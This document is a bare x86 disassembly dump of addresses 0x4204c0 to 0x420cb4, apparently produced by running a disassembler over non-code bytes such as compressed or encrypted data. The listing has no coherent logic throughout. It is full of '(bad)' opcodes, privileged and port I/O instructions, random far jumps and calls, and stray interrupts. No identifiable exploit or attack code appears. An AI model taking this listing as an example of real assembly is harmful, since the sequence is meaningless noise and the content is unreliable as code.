  4204c0:	scas   eax,DWORD PTR es:[edi]
  4204c1:	pop    ss
  4204c2:	hlt    
  4204c3:	ret    
  4204c4:	inc    ecx
  4204c5:	outs   dx,BYTE PTR ds:[esi]
  4204c6:	test   eax,0xc02d029a
  4204cb:	shl    BYTE PTR [ebx+0x4f739b10],1
  4204d1:	jmp    0x97f3:0x2c196b2c
  4204d8:	jne    0x42046b
  4204da:	xchg   ecx,eax
  4204db:	xor    al,0xc7
  4204dd:	retf   
  4204de:	cmp    eax,0x5a72067c
  4204e3:	int    0x4c
  4204e5:	addr16 mov edx,0xfd955bc7
  4204eb:	mov    ds:0xcdc3014d,eax
  4204f0:	int    0xbd
  4204f2:	sub    cl,BYTE PTR [ecx]
  4204f4:	sub    BYTE PTR [edi+0x78],dh
  4204f7:	retf   0xecdc
  4204fa:	pop    esp
  4204fb:	iret   
  4204fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204fd:	mov    ah,0x71
  4204ff:	lahf   
  420500:	mov    WORD PTR [eax-0x1e],ds
  420503:	pop    ecx
  420504:	mov    esp,0x299788ae
  420509:	xor    eax,0x45d552bb
  42050e:	lahf   
  42050f:	sub    ch,BYTE PTR [ecx+0x18]
  420512:	jge    0x420591
  420514:	fistp  QWORD PTR [ebp+0x65]
  420517:	bound  ebx,QWORD PTR [edx*2+0x6bad1869]
  42051e:	inc    ebp
  42051f:	in     eax,0xd8
  420521:	mov    al,0xaa
  420523:	sar    DWORD PTR [edi+0x1db87af0],0xf4
  42052a:	xchg   bx,ax
  42052c:	xlat   BYTE PTR ds:[ebx]
  42052d:	mov    ebp,0x35754d3a
  420532:	dec    ebx
  420533:	pop    ebx
  420534:	jmp    0x36fe5e7c
  420539:	cmp    eax,0xf3c863bc
  42053e:	test   BYTE PTR [esi],0x63
  420541:	nop
  420542:	pop    esi
  420543:	mov    ebx,0x3196f1ff
  420548:	add    DWORD PTR [ebp-0x1af33ebf],esp
  42054e:	jg     0x420507
  420550:	out    dx,eax
  420551:	(bad)  
  420552:	xor    eax,0x907aa517
  420557:	jl     0x420568
  420559:	sub    DWORD PTR [edi-0x6a65ea4c],esi
  42055f:	ror    BYTE PTR [eax+0x27],cl
  420562:	lods   eax,DWORD PTR ds:[esi]
  420563:	adc    BYTE PTR [edx],dl
  420565:	push   ecx
  420566:	mov    edi,0x51c0c34b
  42056b:	gs inc ebp
  42056d:	mov    edx,0x23a84568
  420572:	(bad)  
  420573:	retf   
  420574:	frstpm(287 only) 
  420576:	dec    edx
  420577:	(bad)  
  420578:	out    0x33,eax
  42057a:	or     BYTE PTR [esi],dl
  42057c:	aam    0xdc
  42057e:	clc    
  42057f:	dec    ebx
  420580:	inc    ecx
  420581:	test   ah,ah
  420583:	das    
  420584:	mov    cl,0x46
  420586:	dec    edx
  420587:	dec    edx
  420588:	sti    
  420589:	or     ebp,DWORD PTR [edi-0x7b]
  42058c:	(bad)  [edi-0x4d]
  42058f:	cmp    DWORD PTR [ebx+0x77],edi
  420592:	sbb    eax,0xde2a3b39
  420597:	out    0xd0,al
  420599:	add    eax,0x153c55b2
  42059e:	gs push 0xffffff92
  4205a1:	gs wrmsr 
  4205a4:	je     0x420563
  4205a6:	push   0x90287010
  4205ab:	jnp    0x420603
  4205ad:	sub    bl,BYTE PTR [ecx+0x7829d3e7]
  4205b3:	dec    eax
  4205b4:	xchg   ecx,eax
  4205b5:	adc    dl,BYTE PTR [ebx-0x33]
  4205b8:	sahf   
  4205b9:	and    ecx,DWORD PTR [eax+0x73]
  4205bc:	pop    ebp
  4205bd:	mov    ch,0x5d
  4205bf:	mov    ds:0xcf3b22e9,al
  4205c4:	out    0xcd,eax
  4205c6:	mov    dh,0xab
  4205c8:	cli    
  4205c9:	or     ah,cl
  4205cb:	push   cs
  4205cc:	push   ds
  4205cd:	pop    ebp
  4205ce:	jns    0x42060a
  4205d0:	add    eax,0x4b8807f2
  4205d5:	xchg   ebp,eax
  4205d6:	mov    bl,0xca
  4205d8:	xchg   esp,eax
  4205d9:	aam    0x87
  4205db:	bnd jo 0x420582
  4205de:	ret    0xd6c
  4205e1:	push   es
  4205e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205e3:	sbb    bl,BYTE PTR [ebx]
  4205e5:	(bad)  
  4205e6:	mov    WORD PTR [eax-0x4b9c3890],es
  4205ec:	leave  
  4205ed:	adc    al,0x4d
  4205ef:	clc    
  4205f0:	cmc    
  4205f1:	sbb    al,0xc3
  4205f3:	jno    0x420596
  4205f5:	pop    ds
  4205f6:	into   
  4205f7:	sub    esi,DWORD PTR [edi+0x54aeea57]
  4205fd:	sti    
  4205fe:	sar    DWORD PTR [esi+0x27d549c],0xab
  420605:	sub    al,0x8
  420607:	daa    
  420608:	sbb    eax,0x29c0442f
  42060d:	xor    cl,BYTE PTR [bx+di-0x7a]
  420611:	idiv   BYTE PTR [ebp+0x74]
  420614:	in     al,dx
  420615:	pushf  
  420616:	iret   
  420617:	fadd   DWORD PTR [esi]
  420619:	push   ds
  42061a:	enter  0x12d2,0xd3
  42061e:	mov    dl,0xd4
  420620:	add    edi,edx
  420622:	call   0x19e7:0x14ead91e
  420629:	lock push edx
  42062b:	inc    ebx
  42062c:	add    DWORD PTR [esi],ecx
  42062e:	aaa    
  42062f:	dec    esi
  420630:	inc    ecx
  420631:	xchg   ebp,eax
  420632:	imul   edi,DWORD PTR [ecx+0x7fb11981],0xffffffba
  420639:	jo     0x420676
  42063b:	jecxz  0x420619
  42063d:	fcomp  QWORD PTR [eax]
  42063f:	pop    edi
  420640:	icebp  
  420641:	mov    dl,0x98
  420643:	call   0xf880:0xbc257970
  42064a:	pop    ebx
  42064b:	lock shl DWORD PTR [edi+0xa],0x53
  420650:	or     eax,0xdeba2e22
  420655:	(bad)  
  420656:	mov    ah,0xa6
  420658:	dec    eax
  420659:	jge    0x42060c
  42065b:	xor    BYTE PTR [ecx-0x32],ah
  42065e:	cld    
  42065f:	push   ebp
  420660:	fld    DWORD PTR ds:0x7f33145b
  420666:	add    bl,BYTE PTR [ebp+0x7d6f1da]
  42066c:	call   0xd1d9:0xab8ca63b
  420673:	rol    DWORD PTR cs:[ecx+0x59],0xe
  420678:	and    BYTE PTR [edi-0xf],0x8
  42067c:	leave  
  42067d:	adc    BYTE PTR [ebx-0x563fb818],dh
  420683:	ins    DWORD PTR es:[edi],dx
  420684:	xchg   edx,eax
  420685:	inc    esp
  420686:	sbb    al,0xf8
  420688:	sbb    eax,0xeaf9beb5
  42068d:	imul   eax,DWORD PTR [esi+0x7f],0xffffffa3
  420691:	in     al,0x5c
  420693:	std    
  420694:	imul   ebp,ebx,0x8995be
  42069a:	add    BYTE PTR [eax],al
  42069c:	push   ebx
  42069d:	(bad)  
  42069e:	(bad)  
  42069f:	push   esi
  4206a0:	(bad)  
  4206a1:	jle    0x42069e
  4206a3:	xlat   BYTE PTR ds:[ebx]
  4206a4:	outs   dx,DWORD PTR ds:[esi]
  4206a5:	mov    ah,0x77
  4206a7:	call   0x82b9:0xacf197c8
  4206ae:	add    DWORD PTR [eax],eax
  4206b0:	test   DWORD PTR [edx],eax
  4206b2:	add    BYTE PTR [eax],al
  4206b4:	pop    ebx
  4206b5:	and    BYTE PTR [edx+edx*4-0x5e456f4d],al
  4206bc:	mov    ebp,ss
  4206be:	jle    0x4206fd
  4206c0:	test   eax,0x4be54142
  4206c5:	and    DWORD PTR [edi-0x86f8afb],0x50faa147
  4206cf:	push   ebp
  4206d0:	js     0x4206b5
  4206d2:	mov    ebp,0xf6353c9b
  4206d7:	pop    edx
  4206d8:	sbb    eax,0xf1385f71
  4206dd:	outs   dx,BYTE PTR ds:[esi]
  4206de:	mov    ds:0x1c6747e4,eax
  4206e3:	leave  
  4206e4:	lods   eax,DWORD PTR ds:[esi]
  4206e5:	cdq    
  4206e6:	sub    bl,dh
  4206e8:	sub    eax,DWORD PTR [edx+ecx*8-0x68]
  4206ec:	or     al,0xf
  4206ee:	xchg   esi,eax
  4206ef:	icebp  
  4206f0:	aad    0x8f
  4206f2:	add    DWORD PTR [eax+0x28],ebp
  4206f5:	mov    ebx,0x64775cc6
  4206fa:	enter  0x9fa3,0xed
  4206fe:	pop    esp
  4206ff:	sahf   
  420700:	repz sar ebp,1
  420703:	les    ecx,FWORD PTR [ebx]
  420705:	or     al,0xb1
  420707:	(bad)  
  420708:	cmp    ecx,DWORD PTR [ecx]
  42070a:	call   0xb82239e1
  42070f:	sbb    al,0x3c
  420711:	ds sub al,0xaa
  420714:	jle    0x420789
  420716:	dec    ebx
  420717:	dec    ecx
  420718:	adc    al,0xc0
  42071a:	(bad)  
  42071b:	fwait
  42071c:	jo     0x42072d
  42071e:	int    0x54
  420720:	xchg   DWORD PTR [eax],ecx
  420722:	cmp    dl,BYTE PTR [ecx]
  420724:	btr    edi,esi
  420727:	jp     0x420735
  420729:	push   ss
  42072a:	inc    ebp
  42072b:	pop    es
  42072c:	fisttp WORD PTR [ecx+0x22c932c5]
  420732:	sbb    BYTE PTR [ebp+0x75dd8982],bl
  420738:	xchg   bl,bl
  42073a:	pop    ebx
  42073b:	xor    DWORD PTR [ebx+0x79],0xffffffa9
  42073f:	pop    ds
  420740:	cmp    eax,DWORD PTR [edx+0x7b99499c]
  420746:	pushf  
  420747:	mov    ah,0x2c
  420749:	cmp    ch,BYTE PTR [ecx]
  42074b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42074c:	add    dh,BYTE PTR [edx-0x768933a]
  420752:	std    
  420753:	shl    ebp,cl
  420755:	call   0xc442537
  42075a:	retf   0xe0f3
  42075d:	xor    esp,esi
  42075f:	sbb    ah,0xdd
  420762:	cdq    
  420763:	sub    ah,dl
  420765:	mov    BYTE PTR [edx-0x1e87aaf8],ch
  42076b:	inc    ebp
  42076c:	jecxz  0x420752
  42076e:	and    BYTE PTR [edx-0x39a2f742],0x27
  420775:	inc    edx
  420776:	cmp    eax,0x44647108
  42077b:	fsub   QWORD PTR [edi]
  42077d:	and    al,0x29
  42077f:	push   0x839307b4
  420784:	sahf   
  420785:	ins    DWORD PTR es:[edi],dx
  420786:	sub    edx,DWORD PTR [eax-0x1692706]
  42078c:	popa   
  42078d:	xchg   ecx,eax
  42078e:	mov    ah,0x2
  420790:	dec    ecx
  420791:	jbe    0x420719
  420793:	cdq    
  420794:	cdq    
  420795:	mov    dh,0xd
  420797:	ja     0x42075a
  420799:	sahf   
  42079a:	jnp    0x420727
  42079c:	xchg   esp,eax
  42079d:	fbstp  TBYTE PTR [eax+0x1]
  4207a0:	push   ss
  4207a1:	mov    ds:0x6dc8c3c5,al
  4207a6:	and    al,0xcf
  4207a8:	push   ds
  4207a9:	call   FWORD PTR [edx+0x0]
  4207ac:	or     al,0x16
  4207ae:	jl     0x42082b
  4207b0:	push   0xc827c447
  4207b5:	scas   eax,DWORD PTR es:[edi]
  4207b6:	mov    BYTE PTR ds:0x7f3605b7,bl
  4207bc:	mov    esp,0x64dc0e7f
  4207c1:	fst    st(5)
  4207c3:	jno    0x4207a9
  4207c5:	out    0x34,eax
  4207c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c8:	xchg   edx,eax
  4207c9:	mov    ch,0x4d
  4207cb:	xlat   BYTE PTR ds:[ebx]
  4207cc:	sbb    eax,0x534be91d
  4207d1:	call   0x14ce:0x72f20ff5
  4207d8:	mov    cl,0xb2
  4207da:	or     dl,dl
  4207dc:	and    BYTE PTR [ecx+0x4c9edbe2],bh
  4207e2:	int    0x28
  4207e4:	test   al,0xf
  4207e6:	dec    esp
  4207e7:	loope  0x42083d
  4207e9:	cmp    esi,DWORD PTR [edi-0x6bb2ffa2]
  4207ef:	aaa    
  4207f0:	mov    edx,esi
  4207f2:	dec    bh
  4207f4:	dec    ecx
  4207f5:	xchg   ebp,eax
  4207f6:	xchg   ebp,eax
  4207f7:	inc    edi
  4207f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207f9:	out    0x98,al
  4207fb:	out    0x64,al
  4207fd:	and    al,0xe1
  4207ff:	push   ds
  420800:	mov    ebp,0xe7d9697a
  420805:	or     al,BYTE PTR [eax]
  420807:	pusha  
  420808:	jmp    0x42086a
  42080a:	add    eax,0xd5f8ce01
  42080f:	cwde   
  420810:	dec    ebp
  420811:	inc    esp
  420812:	aaa    
  420813:	in     eax,0xe8
  420815:	pop    ds
  420816:	mov    dh,0x65
  420818:	test   eax,0xe438252b
  42081d:	sub    BYTE PTR [ecx-0x1],bl
  420820:	lea    eax,[edi-0x26]
  420823:	test   DWORD PTR [edi],esi
  420825:	mov    eax,0xda5fc983
  42082a:	sbb    cl,BYTE PTR [bp-0x54c9]
  42082f:	mov    ch,0x8
  420831:	sbb    bl,BYTE PTR [esi-0x1d]
  420834:	cmp    DWORD PTR [edx+0x4c7d03e4],0x77
  42083b:	cmp    esp,edx
  42083d:	inc    BYTE PTR [ecx]
  42083f:	push   cs
  420840:	mov    BYTE PTR [esi+eiz*4-0x7b],dh
  420844:	mov    al,0x4c
  420846:	xchg   ecx,eax
  420847:	loopne 0x42085b
  420849:	dec    eax
  42084a:	and    esi,DWORD PTR [ecx+edi*2+0x707912f1]
  420851:	rcl    dh,1
  420853:	sub    bh,bl
  420855:	outs   dx,BYTE PTR ds:[esi]
  420856:	lods   eax,DWORD PTR ds:[esi]
  420857:	mov    ebp,0xed466482
  42085c:	cmp    dh,BYTE PTR [edi-0x7c]
  42085f:	push   es
  420860:	addr16 (bad) 
  420862:	ficom  WORD PTR [ecx-0x6b]
  420865:	inc    ebx
  420866:	sub    eax,0x50f9a43
  42086b:	in     eax,dx
  42086c:	pop    ebx
  42086d:	stos   DWORD PTR es:[edi],eax
  42086e:	fimul  WORD PTR [ebp+0x19ba1702]
  420874:	sar    bl,0x89
  420877:	cld    
  420878:	test   eax,0x3831779a
  42087d:	xchg   ecx,eax
  42087e:	mov    WORD PTR [edi-0x6b65d9f7],ds
  420884:	push   esi
  420885:	pusha  
  420886:	xor    al,0x8a
  420888:	xchg   dl,al
  42088a:	imul   esi,DWORD PTR [edi],0xaf1b5c84
  420890:	imul   esp,DWORD PTR [ebx+0x27d93bd],0xac01c8f1
  42089a:	ficom  WORD PTR [ebp+0x46]
  42089d:	sbb    DWORD PTR [edi],0xc618b48a
  4208a3:	out    dx,al
  4208a4:	jp     0x4208fa
  4208a6:	out    dx,eax
  4208a7:	in     eax,dx
  4208a8:	adc    dl,bl
  4208aa:	and    DWORD PTR [ebx],edi
  4208ac:	mov    ch,0x55
  4208ae:	and    eax,0x131e99d9
  4208b3:	icebp  
  4208b4:	cli    
  4208b5:	out    dx,eax
  4208b6:	ss repz (bad) 
  4208b9:	retf   
  4208ba:	les    edi,FWORD PTR [ecx-0x4e2b61d7]
  4208c0:	adc    dh,dl
  4208c2:	xor    DWORD PTR [edx+0x65b5a5a],eax
  4208c8:	mov    al,ds:0x6370452c
  4208cd:	icebp  
  4208ce:	jb     0x420878
  4208d0:	fcomi  st,st(7)
  4208d2:	pop    edi
  4208d3:	lea    ebp,[eax+0x17eb3192]
  4208d9:	imul   eax,ebx,0x741d985a
  4208df:	shr    DWORD PTR [ecx+0x41b738d1],cl
  4208e5:	mov    eax,ds:0x6d591858
  4208ea:	aam    0xa4
  4208ec:	dec    ebp
  4208ed:	jl     0x42093c
  4208ef:	loopne 0x42091b
  4208f1:	lahf   
  4208f2:	fdivr  DWORD PTR [edx+edi*1]
  4208f5:	pop    ss
  4208f6:	mov    ebx,0x1eb6a6d4
  4208fb:	push   edx
  4208fc:	and    dh,BYTE PTR [ebx-0x74d8510b]
  420902:	movzx  ecx,BYTE PTR [edx]
  420905:	(bad)  
  420906:	fidiv  DWORD PTR [esi+0x5e]
  420909:	cmp    BYTE PTR [eax],bh
  42090b:	rcl    DWORD PTR [edx],0xb0
  42090e:	pop    ecx
  42090f:	int    0xa3
  420911:	sbb    esi,0xffffffc6
  420914:	sbb    ebp,eax
  420916:	rol    BYTE PTR [ecx],cl
  420918:	retf   
  420919:	lods   al,BYTE PTR ds:[esi]
  42091a:	xlat   BYTE PTR ds:[ebx]
  42091b:	stc    
  42091c:	cwde   
  42091d:	jp     0x420984
  42091f:	sub    eax,0x96c24b69
  420924:	and    ebx,DWORD PTR [eax-0x1c4fbaf2]
  42092a:	jae    0x420942
  42092c:	ja     0x420946
  42092e:	arpl   WORD PTR [esi],bx
  420930:	inc    edx
  420931:	jnp    0x420908
  420933:	data16 mov ds:0xed33cae7,al
  420939:	add    BYTE PTR [eax],al
  42093b:	add    BYTE PTR [ecx],dl
  42093d:	push   cs
  42093e:	or     dl,ch
  420940:	pop    ds
  420941:	out    dx,al
  420942:	repz jmp FWORD PTR [edi+0x58cf0426]
  420949:	sub    BYTE PTR [eax-0x32],bl
  42094c:	test   DWORD PTR ds:[ecx],eax
  42094f:	add    BYTE PTR [ebp-0x54fffffe],al
  420955:	push   0x65fc3fec
  42095a:	xchg   BYTE PTR [ebp+0x46],cl
  42095d:	mov    eax,DWORD PTR [ebp+0x44fefe2d]
  420963:	sbb    BYTE PTR [ebx],cl
  420965:	pop    edi
  420966:	loopne 0x420979
  420968:	mov    bl,0x45
  42096a:	inc    esp
  42096b:	jecxz  0x420945
  42096d:	fwait
  42096e:	(bad)  
  42096f:	jecxz  0x420907
  420971:	jb     0x4209ae
  420973:	out    0x51,eax
  420975:	aas    
  420976:	mov    cl,0x52
  420978:	push   esi
  420979:	push   ss
  42097a:	lds    ebx,FWORD PTR [edx]
  42097c:	jl     0x4209f7
  42097e:	imul   esp,ebx,0x17
  420981:	cmp    BYTE PTR [edx],dl
  420983:	mov    ch,0x6b
  420985:	cld    
  420986:	and    DWORD PTR [edx],ecx
  420988:	sbb    ecx,ecx
  42098a:	pop    DWORD PTR [edi]
  42098c:	das    
  42098d:	adc    eax,0x33975e33
  420992:	cld    
  420993:	mov    al,ds:0x3a4d1ac7
  420998:	pop    esi
  420999:	(bad)  
  42099a:	fcomp  QWORD PTR [esi]
  42099c:	in     al,dx
  42099d:	shr    DWORD PTR [edi],0x45
  4209a0:	and    bh,ch
  4209a2:	and    eax,0x70739e18
  4209a7:	dec    esp
  4209a8:	xor    edi,ebx
  4209aa:	fsubr  QWORD PTR [esi-0x45e81790]
  4209b0:	sbb    eax,0x34bb8c68
  4209b5:	push   ss
  4209b6:	dec    ecx
  4209b7:	bnd jge 0x4209a1
  4209ba:	shl    BYTE PTR [ebp+0x2c],1
  4209bd:	out    dx,eax
  4209be:	sub    BYTE PTR ds:0x4c4a580a,ch
  4209c4:	mov    al,bl
  4209c6:	imul   esi,DWORD PTR [esi],0xffffffe7
  4209c9:	and    DWORD PTR [di],0xe26ad0c8
  4209d0:	loope  0x420997
  4209d2:	ror    BYTE PTR [ecx],1
  4209d4:	sbb    DWORD PTR [edi-0x3],edi
  4209d7:	mov    esp,0xaa5254cf
  4209dc:	mov    ds:0x24ea8fca,eax
  4209e1:	test   ebx,eax
  4209e3:	cmp    eax,0x83831b0b
  4209e8:	push   eax
  4209e9:	jecxz  0x4209a0
  4209eb:	repz scas eax,DWORD PTR es:[edi]
  4209ed:	ror    DWORD PTR [eax+0x4a92ab21],0x52
  4209f4:	aas    
  4209f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209f6:	pusha  
  4209f7:	loope  0x4209e4
  4209f9:	aam    0x8c
  4209fb:	dec    esi
  4209fc:	or     eax,0xe7b3d661
  420a01:	xor    BYTE PTR [edx],al
  420a03:	xor    DWORD PTR [esi],edi
  420a05:	aad    0x33
  420a07:	aad    0xcc
  420a09:	xor    BYTE PTR [eax],dl
  420a0b:	test   cl,dl
  420a0d:	scas   eax,DWORD PTR es:[edi]
  420a0e:	fstp   QWORD PTR [eax+0x39d7ba2a]
  420a14:	cmp    eax,0xb9be15af
  420a19:	xchg   edx,eax
  420a1a:	xchg   BYTE PTR [edx+0x27b603c7],bl
  420a20:	sbb    dl,BYTE PTR [esi+ebx*1-0x2f]
  420a24:	dec    edx
  420a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a26:	call   0xa426:0xd0d5c6ab
  420a2d:	out    0xd0,eax
  420a2f:	cwde   
  420a30:	pop    ebx
  420a31:	mov    WORD PTR [eax-0x39],es
  420a34:	sub    al,0x63
  420a36:	sbb    bl,BYTE PTR [edx+ebx*2]
  420a39:	repnz and DWORD PTR ds:0xbd45bfb0,0x94245b2a
  420a44:	ror    BYTE PTR [ebp+0x44218f14],0x4b
  420a4b:	cmp    BYTE PTR [edi+0x433c311d],ah
  420a51:	fcomp  st(4)
  420a53:	daa    
  420a54:	iret   
  420a55:	jmp    0x5310:0xbed3ade4
  420a5c:	inc    ax
  420a5e:	mov    edi,0xa2adf382
  420a63:	jl     0x420a29
  420a65:	mov    eax,gs
  420a67:	inc    ebp
  420a68:	jo     0x420a15
  420a6a:	xor    DWORD PTR [ecx+ecx*2-0x5],0x9
  420a6f:	jp     0x420a99
  420a71:	or     BYTE PTR [esi+0x46571d1c],bl
  420a77:	mov    WORD PTR [ebp-0xa],gs
  420a7a:	jno    0x420ac6
  420a7c:	addr16 xchg ebx,eax
  420a7e:	mov    dl,0x95
  420a80:	add    ah,BYTE PTR [edi-0x65048a51]
  420a86:	loopne 0x420b07
  420a88:	push   ss
  420a89:	mov    bl,BYTE PTR [esi+0x78aa15c8]
  420a8f:	xor    eax,0x9e34ec27
  420a94:	xchg   edx,eax
  420a95:	in     al,dx
  420a96:	mov    edx,0x93da2184
  420a9b:	adc    BYTE PTR [ebx-0x5c069cda],bh
  420aa1:	(bad)  
  420aa2:	pop    ebp
  420aa3:	xor    al,0x75
  420aa5:	push   0xffffff98
  420aa7:	enter  0x50cd,0x78
  420aab:	fisub  DWORD PTR [edx-0x1ef1b45]
  420ab1:	test   BYTE PTR [edi+0x3],al
  420ab4:	ins    DWORD PTR es:[edi],dx
  420ab5:	arpl   cx,dx
  420ab7:	aam    0x9c
  420ab9:	retf   
  420aba:	mov    ds:0xa5f7de90,eax
  420abf:	push   edx
  420ac0:	ins    DWORD PTR es:[edi],dx
  420ac1:	scas   eax,DWORD PTR es:[edi]
  420ac2:	xchg   BYTE PTR [esi],dh
  420ac4:	xor    dh,BYTE PTR [esi+0x64]
  420ac7:	call   0x75ca2854
  420acc:	jmp    0x31bd5b99
  420ad1:	xchg   edx,eax
  420ad2:	inc    eax
  420ad3:	les    edx,FWORD PTR [eax+0x7a]
  420ad6:	adc    ch,BYTE PTR [ecx+0x4c]
  420ad9:	push   eax
  420ada:	mov    ecx,0x6ac59623
  420adf:	dec    eax
  420ae0:	repnz out dx,eax
  420ae2:	mov    ah,0xdf
  420ae4:	and    al,0x5d
  420ae6:	dec    edx
  420ae7:	pop    ss
  420ae8:	sahf   
  420ae9:	inc    ebx
  420aea:	pop    ebx
  420aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aec:	dec    edx
  420aed:	std    
  420aee:	loop   0x420ad6
  420af0:	push   edi
  420af1:	loop   0x420af7
  420af3:	push   ss
  420af4:	or     BYTE PTR [ecx],bh
  420af6:	test   eax,0x4320b529
  420afb:	adc    ebp,DWORD PTR [esi-0x1b]
  420afe:	mov    ch,0x6c
  420b00:	xchg   ebp,eax
  420b01:	cmp    al,0x4c
  420b03:	into   
  420b04:	mov    eax,ds:0x7609a46b
  420b09:	(bad)
  420b0c:	popa   
  420b0d:	xchg   edx,eax
  420b0e:	and    eax,0x2837aa31
  420b13:	stos   DWORD PTR es:[edi],eax
  420b14:	jno    0x420ac1
  420b16:	scas   eax,DWORD PTR es:[edi]
  420b17:	cmp    al,0xa
  420b19:	stc    
  420b1a:	pop    eax
  420b1b:	fsub   DWORD PTR [ebp-0x77e494ab]
  420b21:	adc    BYTE PTR [ecx-0x6d],ch
  420b24:	adc    DWORD PTR [ecx-0x22503668],0xcf2cd335
  420b2e:	mov    cl,0xb9
  420b30:	inc    eax
  420b31:	dec    ebx
  420b32:	arpl   WORD PTR ds:0x7a65ff02,si
  420b38:	add    al,0x4e
  420b3a:	sub    al,0x5e
  420b3c:	mov    esp,0x7811b521
  420b41:	mov    al,0xa6
  420b43:	data16 add al,BYTE PTR [ecx]
  420b46:	addr16 pop ebp
  420b48:	jg     0x420b53
  420b4a:	push   ebx
  420b4b:	push   ss
  420b4c:	(bad)  [edi-0xf124a88]
  420b52:	out    0x4,al
  420b54:	imul   BYTE PTR [edi+0x2a]
  420b57:	mov    al,0xb0
  420b59:	add    eax,0x46c68ab9
  420b5e:	arpl   WORD PTR [esi+0x5bb95ff6],bx
  420b64:	es enter 0xfd88,0x13
  420b69:	addr16 mov ah,0x4d
  420b6c:	xor    bl,dh
  420b6e:	in     eax,dx
  420b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b70:	adc    ch,BYTE PTR [ebp+edi*1+0x7eb1c2d2]
  420b77:	xchg   ecx,eax
  420b78:	aam    0x87
  420b7a:	(bad)  
  420b7c:	xchg   ecx,eax
  420b7d:	aaa    
  420b7e:	xchg   ebx,eax
  420b7f:	jecxz  0x420bb3
  420b81:	cmp    cl,BYTE PTR [edx]
  420b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b84:	cmp    al,0x49
  420b86:	inc    ebx
  420b87:	push   ss
  420b88:	pop    ebp
  420b89:	(bad)  
  420b8a:	hlt    
  420b8b:	fistp  QWORD PTR [eax]
  420b8d:	inc    edx
  420b8e:	xor    DWORD PTR [edi+0x25],eax
  420b91:	loopne 0x420c02
  420b93:	sub    eax,0xb6ad2bd9
  420b98:	adc    bh,BYTE PTR [esi]
  420b9a:	call   DWORD PTR [ecx-0x31cbea7a]
  420ba0:	sbb    DWORD PTR [edx+0x0],esp
  420ba3:	pushf  
  420ba4:	loopne 0x420b2a
  420ba6:	out    0x1c,eax
  420ba8:	mov    edx,0x4dd3b6ef
  420bad:	jne    0x420c2a
  420baf:	hlt    
  420bb0:	pop    ecx
  420bb1:	cmp    DWORD PTR [eax+ebx*8],edi
  420bb4:	icebp  
  420bb5:	lea    ebx,[edx-0x15534b54]
  420bbb:	hlt    
  420bbc:	mov    ebp,0xe480d262
  420bc1:	pop    edx
  420bc2:	and    ecx,0x4e700428
  420bc8:	test   DWORD PTR [ebp+0x2f],ecx
  420bcb:	fdiv   DWORD PTR [eax-0x6ef3c403]
  420bd1:	repz or bh,BYTE PTR [ecx+0x50]
  420bd5:	xor    dh,0x30
  420bd8:	add    DWORD PTR [eax],0x96c90000
  420bde:	ins    DWORD PTR es:[edi],dx
  420bdf:	mov    dh,0x7f
  420be1:	(bad)  
  420be2:	(bad)  
  420be4:	aam    0xd9
  420be6:	inc    ebx
  420be7:	fcomp  DWORD PTR [edx]
  420be9:	or     DWORD PTR [edx+0x6c],ebp
  420bec:	ret    
  420bed:	xchg   DWORD PTR [ecx],eax
  420bef:	add    BYTE PTR [ebp-0x58fffffe],al
  420bf5:	jmp    0x4add:0x57cca881
  420bfc:	or     esp,DWORD PTR [esi+0x43f36853]
  420c02:	test   al,0xab
  420c04:	retf   0x4aaf
  420c07:	and    edx,ecx
  420c09:	lods   eax,DWORD PTR ds:[esi]
  420c0a:	in     al,0x30
  420c0c:	retf   
  420c0d:	jp     0x420bf5
  420c0f:	stos   DWORD PTR es:[edi],eax
  420c10:	out    0xe4,eax
  420c12:	cmp    eax,0x49e47877
  420c17:	in     eax,0x7
  420c19:	adc    bl,BYTE PTR [edx-0x18]
  420c1c:	js     0x420bb9
  420c1e:	dec    esp
  420c1f:	scas   eax,DWORD PTR es:[edi]
  420c20:	ja     0x420ba2
  420c22:	sbb    al,ah
  420c24:	ds jecxz 0x420bda
  420c27:	mov    ds:0xd37f3f2,al
  420c2c:	shr    BYTE PTR [esi],1
  420c2e:	and    al,0x7c
  420c30:	push   ecx
  420c31:	mov    ebx,0xbe9d7594
  420c36:	ja     0x420c01
  420c38:	add    al,0x20
  420c3a:	retf   
  420c3b:	sbb    cl,BYTE PTR [ebx+0x50]
  420c3e:	dec    edx
  420c3f:	cmp    ebx,DWORD PTR [eax+eax*2+0xdd80e02]
  420c46:	iret   
  420c47:	sbb    BYTE PTR [edx+0x643ade99],cl
  420c4d:	es cmp eax,0x25244b01
  420c53:	xchg   esi,eax
  420c54:	push   0xffffff8c
  420c56:	call   0x7502:0x5e663c0c
  420c5d:	pop    ecx
  420c5e:	and    al,0xc2
  420c60:	sub    eax,ebp
  420c62:	dec    ebx
  420c63:	loope  0x420c71
  420c65:	sar    BYTE PTR [esi+0x47],1
  420c68:	out    0x63,eax
  420c6a:	dec    ecx
  420c6b:	fdivr  st(1),st
  420c6d:	jno    0x420c86
  420c6f:	add    bl,ah
  420c71:	pop    es
  420c72:	(bad)  [ebx-0x5e]
  420c75:	leave  
  420c76:	and    al,0xd5
  420c78:	repz in al,0x2
  420c7b:	dec    esi
  420c7c:	inc    edx
  420c7d:	or     ebp,DWORD PTR [edi-0x2812ae92]
  420c83:	shr    BYTE PTR [ebx-0x4fbbef6],cl
  420c89:	jbe    0x420c4e
  420c8b:	cmp    bl,BYTE PTR [eax+edx*1+0x4a]
  420c8f:	mov    dl,0x32
  420c91:	fcom   st(1)
  420c93:	retf   
  420c94:	imul   esi,DWORD PTR [ecx],0xc57fc790
  420c9a:	add    DWORD PTR [eax+0x683eaed9],edi
  420ca0:	pop    ds
  420ca1:	fbstp  TBYTE PTR [edx+eiz*2]
  420ca4:	add    DWORD PTR [ebx],ecx
  420ca6:	sbb    esi,ebx
  420ca8:	pop    ds
  420ca9:	fwait
  420caa:	sbb    eax,0x3e7613c3
  420caf:	(bad)  
  420cb0:	sar    BYTE PTR [edi+0x6f],0xaa
  420cb4:	mov    ch,0xbb
